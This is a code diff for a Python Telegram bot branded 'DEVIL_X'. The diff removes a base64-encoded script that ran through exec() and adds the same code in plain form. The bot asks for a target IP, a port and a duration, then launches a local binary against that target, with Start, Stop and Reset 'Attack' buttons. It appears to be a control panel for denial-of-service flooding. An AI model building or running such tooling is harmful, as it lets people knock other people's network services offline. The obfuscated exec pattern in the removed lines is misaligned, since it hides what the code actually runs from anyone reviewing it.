@@ -1,8 +1,135 @@
-import base64
+import subprocess
+import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
+from flashh import TOKEN  # Import the TOKEN variable 
 
-# Encoded string embedded directly into the script
-encoded_script = '''aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGxvZ2dpbmcKZnJvbSB0ZWxlZ3JhbSBpbXBvcnQgVXBkYXRlLCBJbmxpbmVLZXlib2FyZEJ1dHRvbiwgSW5saW5lS2V5Ym9hcmRNYXJrdXAKZnJvbSB0ZWxlZ3JhbS5leHQgaW1wb3J0IEFwcGxpY2F0aW9uLCBDb21tYW5kSGFuZGxlciwgTWVzc2FnZUhhbmRsZXIsIENhbGxiYWNrUXVlcnlIYW5kbGVyLCBDb250ZXh0VHlwZXMsIGZpbHRlcnMKZnJvbSBmbGFzaGggaW1wb3J0IFRPS0VOICAjIEltcG9ydCB0aGUgVE9LRU4gdmFyaWFibGUgCgojIFNldCB1cCBsb2dnaW5nCmxvZ2dpbmcuYmFzaWNDb25maWcoZm9ybWF0PSclKGFzY3RpbWUpcyAtICUobmFtZSlzIC0gJShsZXZlbG5hbWUpcyAtICUobWVzc2FnZSlzJywgbGV2ZWw9bG9nZ2luZy5JTkZPKQoKIyBQYXRoIHRvIHlvdXIgYmluYXJ5CkJJTkFSWV9QQVRIID0gIi4vZmxhc2giCgojIEdsb2JhbCB2YXJpYWJsZXMKcHJvY2VzcyA9IE5vbmUKdGFyZ2V0X2lwID0gTm9uZQp0YXJnZXRfcG9ydCA9IE5vbmUKYXR0YWNrX3RpbWUgPSBOb25lCgojIFN0YXJ0IGNvbW1hbmQ6IFNob3cgQXR0YWNrIGJ1dHRvbgphc3luYyBkZWYgc3RhcnQodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAga2V5Ym9hcmQgPSBbW0lubGluZUtleWJvYXJkQnV0dG9uKCLwn5qAQXR0YWNr8J+agCIsIGNhbGxiYWNrX2RhdGE9J2F0dGFjaycpXV0KICAgIHJlcGx5X21hcmt1cCA9IElubGluZUtleWJvYXJkTWFya3VwKGtleWJvYXJkKQogICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dCgiQnkgaHR0cHM6Ly90Lm1lL2ZsYXNobWFpbmNoYW5uZWwg8J+agFByZXNzIHRoZSBBdHRhY2sgYnV0dG9uIHRvIHN0YXJ0IERFVklMX1giLCByZXBseV9tYXJrdXA9cmVwbHlfbWFya3VwKQoKIyBIYW5kbGUgYnV0dG9uIGNsaWNrcwphc3luYyBkZWYgYnV0dG9uX2hhbmRsZXIodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgcXVlcnkgPSB1cGRhdGUuY2FsbGJhY2tfcXVlcnkKICAgIGF3YWl0IHF1ZXJ5LmFuc3dlcigpCgogICAgaWYgcXVlcnkuZGF0YSA9PSAnYXR0YWNrJzoKICAgICAgICBhd2FpdCBxdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoIkJ5IGh0dHBzOi8vdC5tZS9VTUVTSCBQbGVhc2UgZW50ZXIgdGhlIHRhcmdldCwgcG9ydCwgYW5kIHRpbWUgaW4gdGhlIGZvcm1hdDo8dGFyZ2V0PiA8cG9ydD4gPHRpbWU+8J+agPCfmoAiKQoKIyBIYW5kbGUgdGFyZ2V0LCBwb3J0LCBhbmQgdGltZSBpbnB1dAphc3luYyBkZWYgaGFuZGxlX2lucHV0KHVwZGF0ZTogVXBkYXRlLCBjb250ZXh0OiBDb250ZXh0VHlwZXMuREVGQVVMVF9UWVBFKToKICAgIGdsb2JhbCB0YXJnZXRfaXAsIHRhcmdldF9wb3J0LCBhdHRhY2tfdGltZQoKICAgIGlmIHVwZGF0ZS5tZXNzYWdlIGlzIE5vbmU6CiAgICAgICAgYXdhaXQgdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dCgiUGxlYXNlIGVudGVyIHRoZSB0YXJnZXQsIHBvcnQsIGFuZCB0aW1lIGluIHRoZSBmb3JtYXQ6PHRhcmdldD4gPHBvcnQ+IDx0aW1lPvCfmoDwn5qAIikKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgIyBVc2VyIGlucHV0IGlzIGV4cGVjdGVkIGluIHRoZSBmb3JtYXQ6IDx0YXJnZXQ+IDxwb3J0PiA8dGltZT4KICAgICAgICB0YXJnZXQsIHBvcnQsIHRpbWUgPSB1cGRhdGUubWVzc2FnZS50ZXh0LnNwbGl0KCkKICAgICAgICB0YXJnZXRfaXAgPSB0YXJnZXQKICAgICAgICB0YXJnZXRfcG9ydCA9IGludChwb3J0KQogICAgICAgIGF0dGFja190aW1lID0gaW50KHRpbWUpCgogICAgICAgICMgU2hvdyBTdGFydCwgU3RvcCwgYW5kIFJlc2V0IGJ1dHRvbnMgYWZ0ZXIgaW5wdXQgaXMgcmVjZWl2ZWQKICAgICAgICBrZXlib2FyZCA9IFsKICAgICAgICAgICAgW0lubGluZUtleWJvYXJkQnV0dG9uKCJTdGFydCBBdHRhY2vwn5qAIiwgY2FsbGJhY2tfZGF0YT0nc3RhcnRfYXR0YWNrJyldLAogICAgICAgICAgICBbSW5saW5lS2V5Ym9hcmRCdXR0b24oIlN0b3AgQXR0YWNr4p2MIiwgY2FsbGJhY2tfZGF0YT0nc3RvcF9hdHRhY2snKV0sCiAgICAgICAgICAgIFtJbmxpbmVLZXlib2FyZEJ1dHRvbigiUmVzZXQgQXR0YWNr4pqZ77iPIiwgY2FsbGJhY2tfZGF0YT0ncmVzZXRfYXR0YWNrJyldCiAgICAgICAgXQogICAgICAgIHJlcGx5X21hcmt1cCA9IElubGluZUtleWJvYXJkTWFya3VwKGtleWJvYXJkKQogICAgICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoZiJUYXJnZXQ6IHt0YXJnZXRfaXB9LCBQb3J0OiB7dGFyZ2V0X3BvcnR9LCBUaW1lOiB7YXR0YWNrX3RpbWV9IHNlY29uZHMgY29uZmlndXJlZC5cbiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJOb3cgY2hvb3NlIGFuIGFjdGlvbjoiLCByZXBseV9tYXJrdXA9cmVwbHlfbWFya3VwKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dCgnJydJbnZhbGlkIGZvcm1hdC4gUGxlYXNlIGVudGVyIGluIHRoZSBmb3JtYXQ6IAo8dGFyZ2V0PiA8cG9ydD4gPHRpbWU+8J+agPCfmoAnJycpCgojIFN0YXJ0IHRoZSBhdHRhY2sKYXN5bmMgZGVmIHN0YXJ0X2F0dGFjayh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBnbG9iYWwgcHJvY2VzcywgdGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgYXR0YWNrX3RpbWUKICAgIGlmIG5vdCB0YXJnZXRfaXAgb3Igbm90IHRhcmdldF9wb3J0IG9yIG5vdCBhdHRhY2tfdGltZToKICAgICAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJQbGVhc2UgY29uZmlndXJlIHRoZSB0YXJnZXQsIHBvcnQsIGFuZCB0aW1lIGZpcnN0LiIpCiAgICAgICAgcmV0dXJuCgogICAgaWYgcHJvY2VzcyBhbmQgcHJvY2Vzcy5wb2xsKCkgaXMgTm9uZToKICAgICAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJBdHRhY2sgaXMgYWxyZWFkeSBydW5uaW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgICMgUnVuIHRoZSBiaW5hcnkgd2l0aCB0YXJnZXQsIHBvcnQsIGFuZCB0aW1lCiAgICAgICAgcHJvY2VzcyA9IHN1YnByb2Nlc3MuUG9wZW4oW0JJTkFSWV9QQVRILCB0YXJnZXRfaXAsIHN0cih0YXJnZXRfcG9ydCksIHN0cihhdHRhY2tfdGltZSldLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFKQogICAgICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoZiIge3RhcmdldF9pcH06e3RhcmdldF9wb3J0fSBmb3Ige2F0dGFja190aW1lfSBzZWNvbmRzICBXaXRoIERFVklMX1giKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoZiJFcnJvciBzdGFydGluZyBhdHRhY2s6IHtlfSIpCiAgICAgICAgbG9nZ2luZy5lcnJvcihmIkVycm9yIHN0YXJ0aW5nIGF0dGFjazoge2V9IikKCiMgU3RvcCB0aGUgYXR0YWNrCmFzeW5jIGRlZiBzdG9wX2F0dGFjayh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBnbG9iYWwgcHJvY2VzcwogICAgaWYgbm90IHByb2Nlc3Mgb3IgcHJvY2Vzcy5wb2xsKCkgaXMgbm90IE5vbmU6CiAgICAgICAgYXdhaXQgdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dCgiREVWSUxfWCAiKQogICAgICAgIHJldHVybgoKICAgIHByb2Nlc3MudGVybWluYXRlKCkKICAgIHByb2Nlc3Mud2FpdCgpCiAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJBdHRhY2sgc3RvcHBlZC4iKQoKIyBSZXNldCB0aGUgYXR0YWNrCmFzeW5jIGRlZiByZXNldF9hdHRhY2sodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgZ2xvYmFsIHByb2Nlc3MsIHRhcmdldF9pcCwgdGFyZ2V0X3BvcnQsIGF0dGFja190aW1lCiAgICBpZiBwcm9jZXNzIGFuZCBwcm9jZXNzLnBvbGwoKSBpcyBOb25lOgogICAgICAgIHByb2Nlc3MudGVybWluYXRlKCkKICAgICAgICBwcm9jZXNzLndhaXQoKQoKICAgIHRhcmdldF9pcCA9IE5vbmUKICAgIHRhcmdldF9wb3J0ID0gTm9uZQogICAgYXR0YWNrX3RpbWUgPSBOb25lCiAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJBdHRhY2sgcmVzZXQuIEJ5IGh0dHBzOi8vdC5tZS9VTUVTSCBQbGVhc2UgZW50ZXIgdGhlIHRhcmdldCwgcG9ydCwgYW5kIHRpbWUgaW4gdGhlIGZvcm1hdDo8dGFyZ2V0PiA8cG9ydD4gPHRpbWU+8J+agCIpCgojIEJ1dHRvbiBhY3Rpb24gaGFuZGxlciBmb3Igc3RhcnQvc3RvcC9yZXNldCBhY3Rpb25zCmFzeW5jIGRlZiBidXR0b25fY2FsbGJhY2tfaGFuZGxlcih1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBxdWVyeSA9IHVwZGF0ZS5jYWxsYmFja19xdWVyeQogICAgYXdhaXQgcXVlcnkuYW5zd2VyKCkKCiAgICBpZiBxdWVyeS5kYXRhID09ICdzdGFydF9hdHRhY2snOgogICAgICAgIGF3YWl0IHN0YXJ0X2F0dGFjayh1cGRhdGUsIGNvbnRleHQpCiAgICBlbGlmIHF1ZXJ5LmRhdGEgPT0gJ3N0b3BfYXR0YWNrJzoKICAgICAgICBhd2FpdCBzdG9wX2F0dGFjayh1cGRhdGUsIGNvbnRleHQpCiAgICBlbGlmIHF1ZXJ5LmRhdGEgPT0gJ3Jlc2V0X2F0dGFjayc6CiAgICAgICAgYXdhaXQgcmVzZXRfYXR0YWNrKHVwZGF0ZSwgY29udGV4dCkKCiMgTWFpbiBmdW5jdGlvbiB0byBzdGFydCB0aGUgYm90CmRlZiBtYWluKCk6CiAgICAjIENyZWF0ZSBBcHBsaWNhdGlvbiBvYmplY3Qgd2l0aCB5b3VyIGJvdCdzIHRva2VuCiAgICBhcHBsaWNhdGlvbiA9IEFwcGxpY2F0aW9uLmJ1aWxkZXIoKS50b2tlbihUT0tFTikuYnVpbGQoKQoKICAgICMgUmVnaXN0ZXIgY29tbWFuZCBoYW5kbGVyIGZvciAvc3RhcnQKICAgIGFwcGxpY2F0aW9uLmFkZF9oYW5kbGVyKENvbW1hbmRIYW5kbGVyKCJzdGFydCIsIHN0YXJ0KSkKCiAgICAjIFJlZ2lzdGVyIGJ1dHRvbiBoYW5kbGVyCiAgICBhcHBsaWNhdGlvbi5hZGRfaGFuZGxlcihDYWxsYmFja1F1ZXJ5SGFuZGxlcihidXR0b25faGFuZGxlciwgcGF0dGVybj0nXmF0dGFjayQnKSkKICAgIGFwcGxpY2F0aW9uLmFkZF9oYW5kbGVyKENhbGxiYWNrUXVlcnlIYW5kbGVyKGJ1dHRvbl9jYWxsYmFja19oYW5kbGVyLCBwYXR0ZXJuPSdeKHN0YXJ0X2F0dGFja3xzdG9wX2F0dGFja3xyZXNldF9hdHRhY2spJCcpKQoKICAgICMgUmVnaXN0ZXIgbWVzc2FnZSBoYW5kbGVyIHRvIGhhbmRsZSBpbnB1dCBmb3IgdGFyZ2V0LCBwb3J0LCBhbmQgdGltZQogICAgYXBwbGljYXRpb24uYWRkX2hhbmRsZXIoTWVzc2FnZUhhbmRsZXIoZmlsdGVycy5URVhUICYgfmZpbHRlcnMuQ09NTUFORCwgaGFuZGxlX2lucHV0KSkKCiAgICAjIFN0YXJ0IHRoZSBib3QKICAgIGFwcGxpY2F0aW9uLnJ1bl9wb2xsaW5nKCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCk=''
+# Set up logging
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-# Decode and execute the script
-decoded_script = base64.b64decode(encoded_script).decode('utf-8')
-exec(decoded_script)
+# Path to your binary
+BINARY_PATH = "./flash"
+
+# Global variables
+process = None
+target_ip = None
+target_port = None
+attack_time = None
+
+# Start command: Show Attack button
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[InlineKeyboardButton("🚀Attack🚀", callback_data='attack')]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("By https://t.me/flashmainchannel 🚀Press the Attack button to start DEVIL_X", reply_markup=reply_markup)
+
+# Handle button clicks
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    if query.data == 'attack':
+        await query.message.reply_text("By https://t.me/UMESH Please enter the target, port, and time in the format:<target> <port> <time>🚀🚀")
+
+# Handle target, port, and time input
+async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global target_ip, target_port, attack_time
+
+    if update.message is None:
+        await update.callback_query.message.reply_text("Please enter the target, port, and time in the format:<target> <port> <time>🚀🚀")
+        return
+
+    try:
+        # User input is expected in the format: <target> <port> <time>
+        target, port, time = update.message.text.split()
+        target_ip = target
+        target_port = int(port)
+        attack_time = int(time)
+
+        # Show Start, Stop, and Reset buttons after input is received
+        keyboard = [
+            [InlineKeyboardButton("Start Attack🚀", callback_data='start_attack')],
+            [InlineKeyboardButton("Stop Attack❌", callback_data='stop_attack')],
+            [InlineKeyboardButton("Reset Attack⚙️", callback_data='reset_attack')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds configured.\n"
+                                        "Now choose an action:", reply_markup=reply_markup)
+    except ValueError:
+        await update.message.reply_text('''Invalid format. Please enter in the format: 
+<target> <port> <time>🚀🚀''')
+
+# Start the attack
+async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global process, target_ip, target_port, attack_time
+    if not target_ip or not target_port or not attack_time:
+        await update.callback_query.message.reply_text("Please configure the target, port, and time first.")
+        return
+
+    if process and process.poll() is None:
+        await update.callback_query.message.reply_text("Attack is already running.")
+        return
+
+    try:
+        # Run the binary with target, port, and time
+        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), str(attack_time)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        await update.callback_query.message.reply_text(f" {target_ip}:{target_port} for {attack_time} seconds  With DEVIL_X")
+    except Exception as e:
+        await update.callback_query.message.reply_text(f"Error starting attack: {e}")
+        logging.error(f"Error starting attack: {e}")
+
+# Stop the attack
+async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global process
+    if not process or process.poll() is not None:
+        await update.callback_query.message.reply_text("DEVIL_X ")
+        return
+
+    process.terminate()
+    process.wait()
+    await update.callback_query.message.reply_text("Attack stopped.")
+
+# Reset the attack
+async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global process, target_ip, target_port, attack_time
+    if process and process.poll() is None:
+        process.terminate()
+        process.wait()
+
+    target_ip = None
+    target_port = None
+    attack_time = None
+    await update.callback_query.message.reply_text("Attack reset. By https://t.me/UMESH Please enter the target, port, and time in the format:<target> <port> <time>🚀")
+
+# Button action handler for start/stop/reset actions
+async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    if query.data == 'start_attack':
+        await start_attack(update, context)
+    elif query.data == 'stop_attack':
+        await stop_attack(update, context)
+    elif query.data == 'reset_attack':
+        await reset_attack(update, context)
+
+# Main function to start the bot
+def main():
+    # Create Application object with your bot's token
+    application = Application.builder().token(TOKEN).build()
+
+    # Register command handler for /start
+    application.add_handler(CommandHandler("start", start))
+
+    # Register button handler
+    application.add_handler(CallbackQueryHandler(button_handler, pattern='^attack$'))
+    application.add_handler(CallbackQueryHandler(button_callback_handler, pattern='^(start_attack|stop_attack|reset_attack)$'))
+
+    # Register message handler to handle input for target, port, and time
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))
+
+    # Start the bot
+    application.run_polling()
+
+if __name__ == "__main__":
+    main()
+  
